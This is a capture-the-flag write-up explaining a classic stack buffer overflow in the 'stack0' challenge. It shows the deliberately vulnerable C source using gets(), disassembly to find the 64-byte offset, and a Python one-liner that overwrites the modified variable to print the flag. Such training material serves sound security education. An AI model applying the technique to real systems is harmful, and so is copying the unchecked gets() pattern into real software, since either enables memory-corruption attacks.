---
title:  "Writeup: stack0"
date:   2019-03-26 09:00:00
categories: writeup 
layout: post
author: Tim Winters
---

The problem is this challenge is a simple one. `modified` is set to `0`, yet is checked on line 15 to be something else. A standard buffer overflow.


```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  FILE *fp;

  modified = 0;
  gets(buffer);
  fp  = fopen("./flag.txt", "r");

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
      fgets(buffer, 64, (FILE*)fp);
      printf("flag: %s\n", buffer );
  } else {
      printf("Try again?\n");
  }
}
```

The vulnerability is with `gets`, which reads input from standard in, but does no bounds checking. We can use this to write past the memory region allocated to `buffer`, and overwrite the value of `modified`. To determine how many bytes we need to write we must look at this disassembly code. 

<pre>
   0x080484eb <+0>:		lea    ecx,[esp+0x4]
   0x080484ef <+4>:		and    esp,0xfffffff0
   0x080484f2 <+7>:		push   DWORD PTR [ecx-0x4]
   0x080484f5 <+10>:	push   ebp
   0x080484f6 <+11>:	mov    ebp,esp
   0x080484f8 <+13>:	push   ecx
   0x080484f9 <+14>:	sub    esp,0x54
   0x080484fc <+17>:	mov    DWORD PTR [ebp-0x10],0x0
   0x08048503 <+24>:	sub    esp,0xc
   <font color="red">0x08048506 <+27>:	  lea    eax,[ebp-0x50]</font>
   0x08048509 <+30>:	push   eax
   0x0804850a <+31>:	call   0x8048390 &ltgets@plt&gt
</pre>

Calling conventions for Intel x86 say that any arguments will be pushed on the stack. Before the call to `gets` at `main + 31`, the address `epb-0x50` is loaded into `eax` and then pushed onto the stack. Therefore we know that `buffer` starts at address `ebp-0x50`, but I'll use `0x50` for the rest of this guide. 

Now that we know where the buffer is, we need the address of `modified`. Examining the assembly code further

<pre>
   0x0804850f <+36>:	add    esp,0x10
   0x08048512 <+39>:	sub    esp,0x8
   0x08048515 <+42>:	push   0x8048610
   0x0804851a <+47>:	push   0x8048612
   0x0804851f <+52>:	call   0x80483d0 <fopen@plt>
   0x08048524 <+57>:	add    esp,0x10
   0x08048527 <+60>:	mov    DWORD PTR [ebp-0xc],eax
   <font color="red">0x0804852a <+63>:	  mov    eax,DWORD PTR [ebp-0x10]</font>
   0x0804852d <+66>:	test   eax,eax
   0x0804852f <+68>:	je     0x804856b <main+128>
</pre>

Here we see that `ebp - 0x10` (`0x10`) is put into `eax`, then checked to see if it is non-zero through the `test` instruction. More info on that [here](https://reverseengineering.stackexchange.com/questions/19235/purpose-of-test-eax-eax-after-a-strcmp). This must be our `modified` variable. 

Some quick math of `0x50 - 0x10` = `0x40` = `64`. Therefore, we need 64 bytes of data before we start overwriting the `modified` variable. Becaue it need only be non-zero, just writing one byte will work. 

```
> python -c 'print "a"*65' | ./stack0

you have change the 'modified' variable
flag: 3ecc94ee2ad17bf3a32757d1900948bc
```
